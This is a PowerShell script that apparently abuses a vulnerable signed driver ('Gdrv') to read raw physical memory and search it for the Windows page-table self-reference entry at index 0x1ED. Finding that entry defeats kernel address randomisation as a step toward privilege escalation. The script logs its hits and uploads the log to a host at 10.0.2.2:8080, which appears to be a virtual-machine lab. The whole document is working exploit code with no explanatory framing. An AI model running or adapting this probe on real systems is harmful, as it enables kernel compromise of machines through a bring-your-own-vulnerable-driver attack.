# probeE.ps1 - 0x1ED predicate from 64 MB to 1.5 GB with overflow-safe range math
$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::Expect100Continue = $false
$base = 'http://10.0.2.2:8080'
$d = $PSScriptRoot
$log = New-Object System.Collections.ArrayList
function L([string]$s) { $log.Add($s) | Out-Null }
try { Add-Type -Path (Join-Path $d 'p37_prov.cs') } catch { L ('COMPILE FAIL ' + $_.Exception.Message); $log -join "`r`n" | Set-Content "$d\probeE.out"; exit 1 }
$g = [IntPtr]::Zero
$e = [P37Prov]::GdrvOpen([ref]$g)
L ('open=' + $e)
if ($e -ne '') { $log -join "`r`n" | Set-Content "$d\probeE.out"; exit 1 }

$pa = [uint64]0x4000000
$hi = [uint64]0x6000 * [uint64]0x10000
$self = 0; $pre = 0; $pages = 0; $errs = 0; $hits = @(); $firstErr = ''
$t0 = Get-Date
while ($pa -lt $hi) {
    $ok = $true
    try { $b = [P37Prov]::GdrvReadOneRaw($g, $pa, 0x10000) } catch { $ok = $false; $errs++; if ($firstErr -eq '') { $firstErr = ('0x{0:x}: {1}' -f $pa, $_.Exception.Message) } }
    if ($ok) {
        $pages++
        for ($o = 0; $o -lt 0x10000; $o += 0x1000) {
            $pg = $pa + [uint64]$o
            $e0 = [BitConverter]::ToUInt64($b, $o)
            if (($e0 -band 1) -eq 0) { continue }
            $ef = [BitConverter]::ToUInt64($b, $o + 0x1ED * 8)
            if (($ef -band 1) -eq 0) { continue }
            $e255 = [BitConverter]::ToUInt64($b, $o + 255 * 8)
            if (($e255 -band 1) -eq 0) { continue }
            $pre++
            if (($ef -band 0x000FFFFFFFFFF000L) -eq $pg) { $self++; if ($hits.Count -lt 12) { $hits += ('page=0x{0:x} entry=0x{1:x}' -f $pg, $ef) } }
        }
    }
    $pa = $pa + 0x10000
}
L ('sweep 0x4000000-0x60000000 read_ok_blocks={0} read_err={1} pages={2} prefilter={3} self_ref={4} ms={5}' -f $pages, $errs, ($pages * 16), $pre, $self, ((Get-Date) - $t0).TotalMilliseconds)
if ($errs -gt 0) { L ('first_err=' + $firstErr) }
foreach ($h in $hits) { L ('  HIT ' + $h) }
if ($self -gt 0) { L 'VERDICT: predicate FIRES' } else { L 'VERDICT: silent' }
$body = $log -join "`r`n"
Set-Content -LiteralPath "$d\probeE.out" -Value $body
$tag = 'x'
try { $tag = (New-Object Net.WebClient).DownloadString("$base/active.txt").Trim() } catch { }
try { (New-Object Net.WebClient).UploadString("$base/log?vm=$tag", ("## probeE`r`n" + $body)) } catch { }
